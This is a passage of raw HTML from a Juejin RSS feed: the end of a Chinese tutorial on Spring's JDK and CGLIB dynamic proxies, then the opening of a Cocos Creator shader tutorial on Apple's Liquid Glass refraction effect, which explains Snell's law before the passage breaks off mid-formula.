        System.setProperty(<span class="hljs-string">"sun.misc.ProxyGenerator.saveGeneratedFiles"</span>, <span class="hljs-string">"true"</span>);

        <span class="hljs-comment">// CGLIB代理</span>
        System.setProperty(DebuggingClassWriter.DEBUG_LOCATION_PROPERTY, <span class="hljs-string">"/tmp/cglib"</span>);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">createProxy</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ...</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
}
</code></pre>
<h3 data-id="heading-32">八、总结</h3>
<h4 data-id="heading-33">核心知识点回顾</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-type">Spring动态代理核心要点</span>
<span class="hljs-operator">│</span>
<span class="hljs-operator">├──</span> 代理模式基础
<span class="hljs-operator">│</span>   <span class="hljs-operator">├──</span> 静态代理
<span class="hljs-operator">│</span>   <span class="hljs-operator">└──</span> 动态代理
<span class="hljs-operator">│</span>
<span class="hljs-operator">├──</span> <span class="hljs-type">JDK动态代理</span>
<span class="hljs-operator">│</span>   <span class="hljs-operator">├──</span> 基于接口
<span class="hljs-operator">│</span>   <span class="hljs-operator">├──</span> <span class="hljs-type">Proxy</span> <span class="hljs-operator">+</span> <span class="hljs-type">InvocationHandler</span>
<span class="hljs-operator">│</span>   <span class="hljs-operator">└──</span> 限制：必须有接口
<span class="hljs-operator">│</span>
<span class="hljs-operator">├──</span> <span class="hljs-type">CGLIB代理</span>
<span class="hljs-operator">│</span>   <span class="hljs-operator">├──</span> 基于继承
<span class="hljs-operator">│</span>   <span class="hljs-operator">├──</span> <span class="hljs-type">Enhancer</span> <span class="hljs-operator">+</span> <span class="hljs-type">MethodInterceptor</span>
<span class="hljs-operator">│</span>   <span class="hljs-operator">└──</span> 限制：不能代理<span class="hljs-keyword">final</span>类<span class="hljs-operator">/</span>方法
<span class="hljs-operator">│</span>
<span class="hljs-operator">├──</span> <span class="hljs-type">Spring代理选择</span>
<span class="hljs-operator">│</span>   <span class="hljs-operator">├──</span> 默认<span class="hljs-type">JDK代理（有接口）</span>
<span class="hljs-operator">│</span>   <span class="hljs-operator">├──</span> 自动<span class="hljs-type">CGLIB代理（无接口）</span>
<span class="hljs-operator">│</span>   <span class="hljs-operator">└──</span> 强制<span class="hljs-type">CGLIB代理（配置）</span>
<span class="hljs-operator">│</span>
<span class="hljs-operator">├──</span> 实战应用
<span class="hljs-operator">│</span>   <span class="hljs-operator">├──</span> 日志代理
<span class="hljs-operator">│</span>   <span class="hljs-operator">├──</span> 重试代理
<span class="hljs-operator">│</span>   <span class="hljs-operator">├──</span> 缓存代理
<span class="hljs-operator">│</span>   <span class="hljs-operator">└──</span> 权限代理
<span class="hljs-operator">│</span>
<span class="hljs-operator">└──</span> 最佳实践
    <span class="hljs-operator">├──</span> 面向接口编程
    <span class="hljs-operator">├──</span> 避免同类调用
    <span class="hljs-operator">├──</span> 注意<span class="hljs-keyword">final</span><span class="hljs-operator">/</span><span class="hljs-keyword">private</span>方法
    <span class="hljs-operator">└──</span> 合理选择代理方式
</code></pre>
<p>动态代理是Spring框架的核心技术，它使得AOP、事务管理、缓存等功能的实现成为可能。理解JDK动态代理和CGLIB代理的原理和区别，掌握正确的使用方法，能够帮助我们更好地使用Spring框架，并在需要时实现自定义的代理功能。</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Cocos Creator Shader 入门 ⒇ —— 液态玻璃效果]]></title>    <link>https://juejin.cn/post/7575363120798973952</link>    <guid>https://juejin.cn/post/7575363120798973952</guid>    <pubDate>2025-11-23T18:24:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575363120798973952" data-draft-id="7574996958516477971" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Cocos Creator Shader 入门 ⒇ —— 液态玻璃效果"/> <meta itemprop="keywords" content="前端,Cocos Creator"/> <meta itemprop="datePublished" content="2025-11-23T18:24:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="VaJoy"/> <meta itemprop="url" content="https://juejin.cn/user/800100193674760"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Cocos Creator Shader 入门 ⒇ —— 液态玻璃效果
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/800100193674760/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    VaJoy
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T18:24:45.000Z" title="Sun Nov 23 2025 18:24:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>💡 本系列文章收录于<a href="https://juejin.cn/column/7505952781289226291" target="_blank" title="https://juejin.cn/column/7505952781289226291">个人专栏 ShaderMyHead</a>。</p>
<p>💡 本文案例可以<a href="https://link.juejin.cn?target=https%3A%2F%2Fvajoy.github.io%2Fshader-demo%2Findex.html%3Fv%3D20" target="_blank" title="https://vajoy.github.io/shader-demo/index.html?v=20" ref="nofollow noopener noreferrer">在 Github 上进行演示</a>。</p>
</blockquote>
<h2 data-id="heading-0">一、液态玻璃效果介绍</h2>
<p>苹果在 2025 年 6 月的 WWDC 上首次推出了<strong>液态玻璃（Liquid Glass）</strong> 效果，让界面元素呈现出仿佛由弯曲、可折射的玻璃构成的质感：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0c708655b674444b9b2546d83a7ea4d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558237&amp;x-signature=qbC3FpAQF1lPYBQfq2jZbRH%2Fp1I%3D" alt="1.gif" loading="lazy"/></p>
<p>自此，这种同时兼具绚丽与复杂的视觉特效迅速在设计与动效圈走红，成为新一代界面风格的潮流象征。</p>
<p>对于 H5 前端而言，可以借用 SVG 的 <code>&lt;filter&gt;</code> 滤镜中的 <code>&lt;feImage&gt;</code>、<code>&lt;feDisplacementMap&gt;</code>、<code>&lt;feBlend&gt;</code>、<code>&lt;feGaussianBlur&gt;</code>和 <code>&lt;feComposite&gt;</code> 等滤镜基元，对背景色进行色值偏移、柔化和遮罩叠合，从而实现类似的画面扭曲效果。</p>
<p>不久前 Trae Meetup 发布在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fluma.com%2Flq0wo0qs" target="_blank" title="https://luma.com/lq0wo0qs" ref="nofollow noopener noreferrer">Luma 平台上的邀请页</a>，便已应用了这一技术：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1fa7221af6d64fb6a8225755de21a7fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558237&amp;x-signature=8pprHvZh7h0xNT9L7NI2HStj010%3D" alt="9.gif" loading="lazy"/></p>
<p>本文则会以 Cocos Creator 为技术栈，介绍液态玻璃效果的原理，及其着色器的高性能实现。</p>
<h2 data-id="heading-1">二、液态玻璃原理</h2>
<blockquote>
<p>💡 本节部分内容引用自《<a href="https://link.juejin.cn?target=https%3A%2F%2Fkube.io%2Fblog%2Fliquid-glass-css-svg%2F" target="_blank" title="https://kube.io/blog/liquid-glass-css-svg/" ref="nofollow noopener noreferrer">kube.io - Liquid Glass in the Browser</a>》一文。</p>
</blockquote>
<h3 data-id="heading-2">2.1 折射</h3>
<p>折射是指光从一种介质进入另一种介质（如从空气进入玻璃）时改变传播方向的现象。这种偏折之所以发生，是因为光在不同介质中的传播速度不同。</p>
<p>其中我们需要了解的是，入射光与出射光角度的关系由<a href="https://link.juejin.cn?target=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FSnell%2527s_law" target="_blank" title="https://en.wikipedia.org/wiki/Snell%27s_law" ref="nofollow noopener noreferrer">斯涅尔–笛卡尔定律</a>描述：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>n</mi><mn>1</mn></msub><mi>sin</mi><mo>⁡</mo><mo stretchy="false">(</mo><msub><mi>θ</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mi>n</mi><mn>2</mn></msub><mi>sin</mi><mo>⁡</mo><mo stretchy="false">(</mo><msub><mi>θ</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n_1 \sin(\theta_1) = n_2 \sin(\theta_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop">sin</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop">sin</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></div>
<p>其中：</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">n_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 表示介质 1 的折射率；</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">n_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 表示介质 2 的折射率；</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>θ</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\theta_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 表示入射角（光线与法线的夹角）；</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>θ</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\theta_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 表示折射角（折射光线与法线的夹角）。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77ecf8ebc0054d76bfa623b4ad669a0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558237&amp;x-signature=LkL%2FWhU%2FdkJB9GvLYbroW%2FXoYz0%3D" alt="3.gif" loading="lazy"/></p>
<p>其表现为：</p>
<ul>
<li>当 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mn>1</mn></msub><mo>=</mo><msub><mi>n</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">n_1 = n_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 时，光线会直线穿过介质；</li>
<li>当 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mn>1</mn></msub><mo>&lt;</mo><msub><mi>n</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">n_1 &lt; n_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 时，光线会穿过介质且往法线（上图 Normal 虚线）方向发生偏折；</li>
<li>当 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mn>1</mn></msub><mo>&gt;</mo><msub><mi>n</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">n_1 &gt; n_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 时，存在一个临界角 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>θ</mi><mi>c</mi></msub><mo>=</mo><mi>arcsin</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><mfrac><msub><mi>n</mi><mn>2</mn></msub><msub><mi>n</mi><mn>1</mn></msub></mfrac><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\theta_c = \arcsin\left(\frac{n_2}{n_1}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.8em;vertical-align:-0.65em;"/><span class="mop">arcsin</span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7115em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span/></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.4101em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span/></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4451em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span></span></span></span></span>，若 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>θ</mi><mn>1</mn></msub><mo>&gt;</mo><msub><mi>θ</mi><mi>c</mi></msub></mrow><annotation encoding="application/x-tex">\theta_1 &gt; \theta_c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span 